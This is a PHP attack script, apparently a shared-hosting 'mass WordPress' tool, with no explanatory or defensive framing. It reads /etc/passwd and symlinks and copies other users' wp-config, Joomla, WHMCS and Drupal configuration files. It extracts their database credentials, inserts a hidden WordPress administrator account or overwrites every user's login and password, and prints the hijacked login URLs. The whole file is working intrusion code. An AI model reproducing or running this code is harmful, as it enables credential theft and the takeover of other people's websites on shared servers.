<?php
        //error_reporting(0);
        ini_set("max_execution_time",0);
        session_start();


        function sym() //symlinker function
        {
                $dir = file("/etc/passwd");
                mkdir("cikusmasswp", 0755);
                chdir("cikusmasswp");
                $ht   = 'Options Indexes FollowSymLinks
              DirectoryIndex achon666ju5t.extremecrew
              AddType txt .php
              AddHandler txt .php';
                $file = fopen(".htaccess", "w+");
                fwrite($file, $ht);
                fclose($file);
                $list = Array(
                    "wp-config.php",
                    "wp/wp-config.php",
                    "WP/wp-config.php",
                    "wp/beta/wp-config.php",
                    "beta/wp-config.php",
                    "press/wp-config.php",
                    "wordpress/wp-config.php",
                    "Wordpress/wp-config.php",
                    "blog/wp-config.php",
                    "config.php",
                    "news/wp-config.php",
                    "new/wp-config.php",
                    "blogs/wp-config.php",
                    "home/wp-config.php",
                    "db.php",
                    "site/wp-config.php",
                    "main/wp-config.php",
                    "test/wp-config.php",
                    "configuration.php",
                    "blog/configuration.php",
                    "joomla/configuration.php",
                    "cms/configuration.php",
                    "portal/configuration.php",
                    "news/configuration.php",
                    "home/configuration.php",
                    "www/configuration.php",
                    "site/configuration.php",
                    "sites/configuration.php",
                    "vb/includes/config.php",
                    "whm/configuration.php",
                    "central/configuration.php",
                    "whm/whmcs/configuration.php",
                    "whm/WHMCS/configuration.php",
                    "whmc/WHM/configuration.php",
                    "whmcs/configuration.php",
                    "support/configuration.php",
                    "submitticket.php",
                    "whm/configuration.php",
                    "drupal/sites/default/settings.php",
                    "drupal7/sites/default/settings.php",
                    "sites/default/settings.php"
                );
                foreach ($dir as $users) {
                    $user = explode(":", $users);
                    foreach ($list as $confurl) {
                        symlink("/home/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        symlink("/home1/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        symlink("/home2/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        symlink("/home3/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        symlink("/home4/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        symlink("/home5/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        symlink("/home6/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        symlink("/home7/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        symlink("/home8/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        symlink("/home9/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        copy("/home/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        copy("/home1/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        copy("/home2/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        copy("/home3/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        copy("/home4/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        copy("/home5/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        copy("/home6/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        copy("/home7/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        copy("/home8/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                        copy("/home9/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
                    }
                }
                chdir("..");
        }
        sym();
        function wpmass()
        {
            $_total_done = 0;
            $_path = getcwd() . "/cikusmasswp/";
                $url  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
                $url = str_replace(basename($_SERVER["SCRIPT_FILENAME"]), "", $url);
                $url  = $url . "/cikusmasswp/";
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_URL, $url);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                $get2 = curl_exec($curl);
                preg_match_all('#<a href="(.*?)"#', $get2, $config);
                foreach ($config[1] as $don) {
                    $_dirs = scandir($_path);
                    $_true = 0;
                    foreach ($_dirs as $_dir) {
                        if (preg_match("/wp-config/", $_dir)) {
                            $_true++;
                        }
                    }
                    if ($_true > 0) {
                        chdir($_path);
                        $openht = fopen(".htaccess", "w+");
                        fwrite($openht, "Options Indexes FollowSymLinks
                    DirectoryIndex achon666ju5t.extremecrew
                    AddType txt .php
                    AddHandler txt .php
                    ReadmeName " . $don);
                        fclose($openht);
                        $cur = curl_init();
                        curl_setopt($cur, CURLOPT_URL, $url);
                        curl_setopt($cur, CURLOPT_RETURNTRANSFER, true);
                        $get = curl_exec($cur);
                        preg_match_all("#'DB_HOST', '(.*?)'#", $get, $host);
                        foreach ($host[1] as $don) {
                            $host = $don;
                        }
                        ###
                        preg_match_all("#'DB_PASSWORD', '(.*?)'#", $get, $pass);
                        foreach ($pass[1] as $done) {
                            $password = $done;
                        }
                        ###
                        preg_match_all("#'DB_USER', '(.*?)'#", $get, $user);
                        foreach ($user[1] as $done1) {
                            $user = $done1;
                        }
                        ###
                        preg_match_all("#'DB_NAME', '(.*?)'#", $get, $name);
                        foreach ($name[1] as $done2) {
                            $name = $done2;
                        }
                        ###
                        preg_match_all("#$table_prefix  = '(.*?)'#", $get, $prefix);
                        foreach ($prefix[1] as $done3) {
                            $prefix = $done3;
                        }
                        $connect = mysqli_connect($host, $user, $password, $name);
                        if ($connect) {
                            $qr1=mysqli_query($connect,"INSERT INTO `".$prefix."users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`) VALUES ('spyv2', '21232f297a57a5a743894a0e4a801fc3', 'firstname lastname', 'email@example.com', '0');");
                            $qr2=mysqli_query($connect,"INSERT INTO `".$prefix."usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, (Select max(id) FROM ".$prefix."users), '".$prefix."capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');");
                            $qr3=mysqli_query($connect,"INSERT INTO `".$prefix."usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, (Select max(id) FROM ".$prefix."users), '".$prefix."user_level', '10');");
                            $qr4=mysqli_query($connect,"SELECT `option_value` FROM `".$prefix."options` WHERE `option_name`='siteurl'");
                            $data=mysqli_fetch_array($qr4);
                            if ($qr1 && $qr2 && $qr3 && $qr4) {
                                $_total_done++;
                                $siteeurl = $data["option_value"] . "/wp-login.php";
                                $siteeurl = str_replace("//wp", "/wp", $siteeurl);
                                echo "$siteeurl|cikus|cikus<br>";
                            } else {
                                $query1 = mysqli_query($connect,"select * from ".$prefix."options where option_name='siteurl'");
                                while($siteurl = mysqli_fetch_array($query1)){
                                    $site_url = $siteurl['option_value'];
                                }
                                $siteeurl = $site_url . "/wp-login.php";
                                $siteeurl = str_replace("//wp", "/wp", $siteeurl);
                                $query2 = mysqli_query($connect,"update ".$prefix."users set user_login='Admin',user_pass='c7433bf0630d8def04ad22c9f5308783'");
                                if($query2){
                                    $_total_done++;
                                    echo "$siteeurl|cikus|admin<br>";
                                }
                            }
                        }
                    }
                }
        }
        wpmass();
?>
